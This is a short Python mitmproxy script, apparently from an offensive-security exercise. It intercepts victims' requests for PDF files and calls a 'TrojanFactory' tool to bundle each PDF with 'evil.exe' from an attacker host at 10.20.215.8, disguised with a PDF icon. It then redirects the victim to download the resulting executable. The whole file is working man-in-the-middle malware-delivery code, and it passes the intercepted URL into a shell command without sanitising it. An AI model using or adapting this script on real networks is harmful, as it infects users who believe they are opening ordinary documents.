import mitmproxy
import subprocess

def request(flow):
	#code to handle request flows
	
	if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
		print("[+] Got interesting flow")
		
        #each file they want to see, we will add our trojan with the requested file
        # '#' is for not stucking in a loop (not to create trojan for trojan)
		front_file = flow.request.pretty_url + "#"
		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
		
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.20.215.8/file.exe"})
	
